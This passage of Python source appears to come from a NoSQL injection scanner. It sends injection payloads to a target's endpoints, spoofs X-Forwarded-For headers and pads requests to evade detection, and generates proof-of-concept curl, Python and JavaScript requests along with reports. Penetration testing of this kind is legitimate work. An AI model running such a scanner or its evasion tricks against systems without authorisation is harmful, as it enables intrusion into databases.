    async def _get_baseline_advanced(self, endpoint: str, method: str) -> Optional[Dict[str, Any]]:
        """Get advanced baseline with multiple samples"""
        samples = []
        
        # Get multiple baseline samples for stability
        for i in range(3):
            test_data = self._get_test_data(method)
            
            # Add some randomness to avoid caching
            test_data['_random'] = ''.join(random.choices(string.ascii_letters, k=8))
            
            try:
                start_time = time.time()
                
                if method == 'GET':
                    async with self.session.get(endpoint, params=test_data) as response:
                        content = await response.text()
                        response_time = time.time() - start_time
                else:
                    # Determine content type from fingerprint
                    fingerprint = self.endpoint_fingerprints.get(endpoint, {})
                    content_types = fingerprint.get('content_types', [])
                    
                    if any('json' in ct for ct in content_types):
                        # Send as JSON
                        async with self.session.post(endpoint, json=test_data) as response:
                            content = await response.text()
                            response_time = time.time() - start_time
                    else:
                        # Send as form data
                        async with self.session.post(endpoint, data=test_data) as response:
                            content = await response.text()
                            response_time = time.time() - start_time
                
                sample = {
                    'method': method,
                    'status': response.status,
                    'content': content,
                    'length': len(content),
                    'response_time': response_time,
                    'headers': dict(response.headers)
                }
                
                samples.append(sample)
                
            except Exception as e:
                self.logger.debug(f"Error getting baseline sample: {e}")
                
            if i < 2:  # Don't delay after last sample
                await asyncio.sleep(0.5)
                
        if not samples:
            return None
            
        # Average the samples
        baseline = {
            'method': method,
            'status': samples[0]['status'],  # Use first status
            'content': samples[0]['content'],  # Use first content
            'length': sum(s['length'] for s in samples) // len(samples),
            'response_time': sum(s['response_time'] for s in samples) / len(samples),
            'headers': samples[0]['headers']
        }
        
        return baseline
    
    async def _send_payload_advanced(self, endpoint: str, method: str, param: str, 
                                   payload: Any, baseline: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Send payload with advanced options"""
        try:
            self.request_count += 1
            
            # Prepare headers
            headers = {
                'User-Agent': self._get_user_agent(),
                'Accept': baseline.get('headers', {}).get('accept', '*/*'),
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            # Add random headers for evasion
            if self.config['evasion_techniques']['use_encoding']:
                headers['X-Forwarded-For'] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                headers['X-Originating-IP'] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            
            start_time = time.time()
            
            if method == 'GET':
                # For GET, payload might need special handling
                if isinstance(payload, dict):
                    # Convert dict payload to query parameters
                    params = {param: json.dumps(payload)}
                else:
                    params = {param: payload}
                    
                async with self.session.get(
                    endpoint,
                    params=params,
                    headers=headers,
                    allow_redirects=self.config['follow_redirects']
                ) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
            else:  # POST, PUT, etc.
                # Determine content type
                fingerprint = self.endpoint_fingerprints.get(endpoint, {})
                use_json = any('json' in ct for ct in fingerprint.get('content_types', ['application/json']))
                
                if use_json:
                    # JSON payload
                    data = {param: payload}
                    
                    # Add other baseline parameters to avoid detection
                    test_data = self._get_test_data(method)
                    for key, value in test_data.items():
                        if key != param:
                            data[key] = value
                            
                    async with self.session.request(
                        method,
                        endpoint,
                        json=data,
                        headers=headers,
                        allow_redirects=self.config['follow_redirects']
                    ) as response:
                        content = await response.text()
                        response_time = time.time() - start_time
                else:
                    # Form data
                    if isinstance(payload, dict):
                        # Special handling for dict payloads in form data
                        data = {f"{param}[{k}]": v for k, v in payload.items()}
                    else:
                        data = {param: payload}
                        
                    async with self.session.request(
                        method,
                        endpoint,
                        data=data,
                        headers=headers,
                        allow_redirects=self.config['follow_redirects']
                    ) as response:
                        content = await response.text()
                        response_time = time.time() - start_time
                        
            return {
                'status': response.status,
                'content': content,
                'length': len(content),
                'response_time': response_time,
                'headers': dict(response.headers)
            }
            
        except asyncio.TimeoutError:
            # Timeout might indicate successful time-based injection
            return {
                'status': 0,
                'content': '',
                'length': 0,
                'response_time': self.config['timeout'],
                'timeout': True
            }
        except Exception as e:
            self.logger.debug(f"Error sending payload: {e}")
            return None
    
    def _generate_advanced_report(self) -> Dict[str, Any]:
        """Generate comprehensive report with PoC"""
        elapsed_time = time.time() - self.start_time
        
        # Group and analyze results
        by_endpoint = defaultdict(list)
        by_type = defaultdict(list)
        by_severity = defaultdict(list)
        
        for result in self.results:
            by_endpoint[result.endpoint].append(result)
            by_type[result.injection_type.value].append(result)
            by_severity[result.severity].append(result)
            
        # Generate PoCs if enabled
        pocs = []
        if self.config['reporting']['generate_poc']:
            for result in self.results[:5]:  # Top 5 vulnerabilities
                poc = self._generate_poc(result)
                pocs.append(poc)
                
        report = {
            'metadata': {
                'tool': 'NoSQL Detector v2.0',
                'author': 'https://github.com/skypoc',
                'scan_date': datetime.now().isoformat(),
                'duration': f"{elapsed_time:.2f} seconds",
                'total_requests': self.request_count,
                'requests_per_second': self.request_count / elapsed_time if elapsed_time > 0 else 0
            },
            'executive_summary': {
                'total_vulnerabilities': len(self.results),
                'critical': len(by_severity.get('Critical', [])),
                'high': len(by_severity.get('High', [])),
                'medium': len(by_severity.get('Medium', [])),
                'low': len(by_severity.get('Low', [])),
                'vulnerable_endpoints': len(by_endpoint),
                'injection_types': list(by_type.keys()),
                'confidence_average': sum(r.confidence for r in self.results) / len(self.results) if self.results else 0
            },
            'findings': {
                'by_endpoint': {
                    endpoint: [
                        {
                            'parameter': r.parameter,
                            'type': r.injection_type.value,
                            'severity': r.severity,
                            'confidence': f"{r.confidence * 100:.0f}%",
                            'method': r.method,
                            'evidence': r.evidence,
                            'remediation': r.remediation,
                            'cve_references': r.cve_references
                        }
                        for r in vulns
                    ]
                    for endpoint, vulns in by_endpoint.items()
                },
                'by_severity': {
                    severity: [
                        {
                            'endpoint': r.endpoint,
                            'parameter': r.parameter,
                            'type': r.injection_type.value,
                            'confidence': f"{r.confidence * 100:.0f}%"
                        }
                        for r in vulns
                    ]
                    for severity, vulns in by_severity.items()
                }
            },
            'proof_of_concepts': pocs,
            'recommendations': self._generate_recommendations(),
            'technical_details': {
                'endpoints_tested': len(self.endpoint_fingerprints),
                'parameters_tested': len(self.parameter_types),
                'payloads_used': sum(len(v) for v in self.payload_db.payloads.values()),
                'ml_detections': len([r for r in self.results if 'ML' in r.evidence]),
                'fingerprints': self.endpoint_fingerprints
            }
        }
        
        # Save report
        report_filename = f'nosql_detection_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(report_filename, 'w') as f:
            json.dump(report, f, indent=2)
            
        self.logger.info(f"Report saved to {report_filename}")
        
        # Also save a simplified HTML report
        self._save_html_report(report)
        
        return report
    
    def _generate_poc(self, result: DetectionResult) -> Dict[str, Any]:
        """Generate proof of concept for a vulnerability"""
        poc = {
            'vulnerability': result.injection_type.value,
            'endpoint': result.endpoint,
            'parameter': result.parameter,
            'method': result.method,
            'severity': result.severity
        }
        
        # Generate curl command
        if result.method == 'GET':
            if isinstance(result.payload[result.parameter], dict):
                # URL encode the JSON payload
                payload_str = json.dumps(result.payload[result.parameter])
                encoded = quote(payload_str)
                poc['curl'] = f'curl -X GET "{result.endpoint}?{result.parameter}={encoded}"'
            else:
                poc['curl'] = f'curl -X GET "{result.endpoint}?{result.parameter}={result.payload[result.parameter]}"'
        else:
            # POST request
            if isinstance(result.payload[result.parameter], dict):
                json_data = json.dumps({result.parameter: result.payload[result.parameter]})
                poc['curl'] = f"curl -X {result.method} {result.endpoint} -H 'Content-Type: application/json' -d '{json_data}'"
            else:
                poc['curl'] = f"curl -X {result.method} {result.endpoint} -d '{result.parameter}={result.payload[result.parameter]}'"
                
        # Generate Python code
        poc['python'] = self._generate_python_poc(result)
        
        # Generate JavaScript code
        poc['javascript'] = self._generate_javascript_poc(result)
        
        return poc
    
    def _generate_python_poc(self, result: DetectionResult) -> str:
        """Generate Python PoC code"""
        if result.method == 'GET':
            return f"""
import requests

url = "{result.endpoint}"
params = {{"{result.parameter}": {repr(result.payload[result.parameter])}}}

response = requests.get(url, params=params)
print(f"Status: {{response.status_code}}")
print(f"Response: {{response.text[:200]}}...")
"""
        else:
            return f"""
import requests

url = "{result.endpoint}"
data = {{"{result.parameter}": {repr(result.payload[result.parameter])}}}

response = requests.post(url, json=data)
print(f"Status: {{response.status_code}}")
print(f"Response: {{response.text[:200]}}...")
"""
    
    def _generate_javascript_poc(self, result: DetectionResult) -> str:
        """Generate JavaScript PoC code"""
        payload_str = json.dumps(result.payload[result.parameter])
        
        return f"""
// Browser console or Node.js
const payload = {payload_str};

fetch('{result.endpoint}', {{
    method: '{result.method}',
    headers: {{ 'Content-Type': 'application/json' }},
    body: JSON.stringify({{'{result.parameter}': payload}})
}})
.then(res => res.text())
.then(data => console.log('Response:', data))
.catch(err => console.error('Error:', err));
"""
    
    def _save_html_report(self, report: Dict[str, Any]):
        """Save HTML version of the report"""
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NoSQL Injection Detection Report</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 30px;
        }
        .header h1 {
            margin: 0;
            font-size: 2.5em;
        }
        .header p {
            margin: 10px 0 0;
            opacity: 0.9;
        }
        .summary {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .summary-card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            text-align: center;
        }
        .summary-card h3 {
            margin: 0 0 10px;
            color: #667eea;
        }
        .summary-card .value {
            font-size: 2em;
            font-weight: bold;
        }
        .critical { color: #dc3545; }
        .high { color: #fd7e14; }
        .medium { color: #ffc107; }
        .low { color: #28a745; }
        .vulnerability {
            background: white;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-left: 4px solid #667eea;
        }
        .vulnerability.critical { border-left-color: #dc3545; }
        .vulnerability.high { border-left-color: #fd7e14; }
        .vulnerability.medium { border-left-color: #ffc107; }
        .vulnerability.low { border-left-color: #28a745; }
        .vulnerability h3 {
            margin: 0 0 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .severity-badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8em;
            color: white;
            font-weight: bold;
        }
        .severity-badge.critical { background: #dc3545; }
        .severity-badge.high { background: #fd7e14; }
        .severity-badge.medium { background: #ffc107; color: #333; }
        .severity-badge.low { background: #28a745; }
        .details {
            margin: 15px 0;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 5px;
        }
        .code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            margin: 10px 0;
        }
        .recommendations {
            background: #e3f2fd;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #2196f3;
        }
        .recommendations h2 {
            color: #1976d2;
            margin-top: 0;
        }
        .recommendations ul {
            margin: 0;
            padding-left: 20px;
        }
        .recommendations li {
            margin: 10px 0;
        }
        .footer {
            text-align: center;
            margin-top: 50px;
            padding: 20px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>NoSQL Injection Detection Report</h1>
        <p>Generated by NoSQL Detector v2.0 | {scan_date}</p>
        <p>Duration: {duration} | Total Requests: {total_requests}</p>
    </div>
    
    <div class="summary">
        <div class="summary-card">
            <h3>Total Vulnerabilities</h3>
            <div class="value">{total_vulnerabilities}</div>
        </div>
        <div class="summary-card">
            <h3>Critical</h3>
            <div class="value critical">{critical}</div>
        </div>
        <div class="summary-card">
            <h3>High</h3>
            <div class="value high">{high}</div>
        </div>
        <div class="summary-card">
            <h3>Medium</h3>
            <div class="value medium">{medium}</div>
        </div>
        <div class="summary-card">
            <h3>Low</h3>
            <div class="value low">{low}</div>
        </div>
        <div class="summary-card">
            <h3>Confidence Average</h3>
            <div class="value">{confidence_avg}%</div>
        </div>
    </div>
    
    <h2>Vulnerability Details</h2>
    {vulnerabilities}
    
    <div class="recommendations">
        <h2>Security Recommendations</h2>
        <ul>
            {recommendations}
        </ul>
    </div>
    
    <div class="footer">
        <p>Report generated by <a href="https://github.com/skypoc">NoSQL Detector</a></p>
        <p>For authorized security testing only</p>
    </div>
</body>
</html>
"""
        
        # Build vulnerability cards
        vuln_html = ""
        for endpoint, vulns in report['findings']['by_endpoint'].items():
            for vuln in vulns:
                severity_lower = vuln['severity'].lower()
                vuln_html += f"""
                <div class="vulnerability {severity_lower}">
                    <h3>
                        <span>{endpoint}</span>
                        <span class="severity-badge {severity_lower}">{vuln['severity']}</span>
                    </h3>
                    <div class="details">
                        <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                        <p><strong>Type:</strong> {vuln['type']}</p>
                        <p><strong>Method:</strong> {vuln['method']}</p>
                        <p><strong>Confidence:</strong> {vuln['confidence']}</p>
                        <p><strong>Evidence:</strong> {vuln['evidence']}</p>
                    </div>
                    <div class="code">{vuln.get('remediation', 'Implement input validation')}</div>
                </div>
                """
                
        # Build recommendations
        rec_html = ""
        for rec in report['recommendations']:
            rec_html += f"<li>{rec}</li>"
            
        # Fill template
        html_content = html_template.format(
            scan_date=report['metadata']['scan_date'],
            duration=report['metadata']['duration'],
            total_requests=report['metadata']['total_requests'],
            total_vulnerabilities=report['executive_summary']['total_vulnerabilities'],
            critical=report['executive_summary']['critical'],
            high=report['executive_summary']['high'],
            medium=report['executive_summary']['medium'],
            low=report['executive_summary']['low'],
            confidence_avg=int(report['executive_summary']['confidence_average'] * 100),
            vulnerabilities=vuln_html,
            recommendations=rec_html
        )
        
        # Save HTML file
        html_filename = f'nosql_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.html'
        with open(html_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
            
        self.logger.info(f"HTML report saved to {html_filename}")
    
    # ... (continue with remaining helper methods) ...

# Entry point remains the same
async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Advanced NoSQL Injection Detector v2.0',
        epilog='Made by https://github.com/skypoc'
    )
    
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-c', '--config', help='Configuration file path')
    parser.add_argument('-e', '--endpoints', nargs='+', help='Specific endpoints to test')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--timeout', type=int, help='Request timeout in seconds')
    parser.add_argument('--threads', type=int, help='Maximum concurrent requests')
    parser.add_argument('--ml', action='store_true', help='Enable ML detection (default: enabled)')
    parser.add_argument('--no-ml', action='store_true', help='Disable ML detection')
    
    args = parser.parse_args()
    
    # Create detector instance
    detector = NoSQLDetector(args.config)
    
    # Override config with command line arguments
    if args.timeout:
        detector.config['timeout'] = args.timeout
    if args.threads:
        detector.config['max_concurrent_requests'] = args.threads
    if args.verbose:
        detector.logger.setLevel(logging.DEBUG)
    if args.no_ml:
        detector.config['ml_detection']['enabled'] = False
    
    # Run detection
    try:
        report = await detector.detect(args.target, args.endpoints)
        
        # Display summary
        print("\n" + "="*60)
        print("NoSQL INJECTION DETECTION SUMMARY")
        print("="*60)
        print(f"Target: {args.target}")
        print(f"Duration: {report['metadata']['duration']}")
        print(f"Total Requests: {report['metadata']['total_requests']}")
        print(f"Vulnerabilities Found: {report['executive_summary']['total_vulnerabilities']}")
        print(f"Critical: {report['executive_summary']['critical']}")
        print(f"High: {report['executive_summary']['high']}")
        print(f"Medium: {report['executive_summary']['medium']}")
        print(f"Low: {report['executive_summary']['low']}")
        print(f"Average Confidence: {report['executive_summary']['confidence_average']*100:.0f}%")
        print("="*60)
        
        if report['executive_summary']['total_vulnerabilities'] > 0:
            print("\nTOP VULNERABILITIES:")
            
            # Show critical and high severity first
            shown = 0
            for severity in ['Critical', 'High', 'Medium', 'Low']:
                severity_vulns = report['findings']['by_severity'].get(severity, [])
                for vuln in severity_vulns[:3]:  # Max 3 per severity
                    if shown >= 5:  # Total max 5
                        break
                    print(f"\n[{severity.upper()}] {vuln['endpoint']}")
                    print(f"  Parameter: {vuln['parameter']}")
                    print(f"  Type: {vuln['type']}")
                    print(f"  Confidence: {vuln['confidence']}")
                    shown += 1
                    
            remaining = report['executive_summary']['total_vulnerabilities'] - shown
            if remaining > 0:
                print(f"\n... and {remaining} more vulnerabilities")
                
            # Show sample PoC if available
            if report.get('proof_of_concepts'):
                print("\nSAMPLE PROOF OF CONCEPT:")
                poc = report['proof_of_concepts'][0]
                print(f"Vulnerability: {poc['vulnerability']}")
                print(f"Severity: {poc['severity']}")
                print(f"\nCURL command:")
                print(poc['curl'])
                
        print(f"\nFull report saved to: nosql_detection_report_*.json")
        print(f"HTML report saved to: nosql_report_*.html")
        
        # Save custom output if requested
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"Results also saved to: {args.output}")
            
    except KeyboardInterrupt:
        print("\n\nScan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\nError during scan: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    asyncio.run(main())
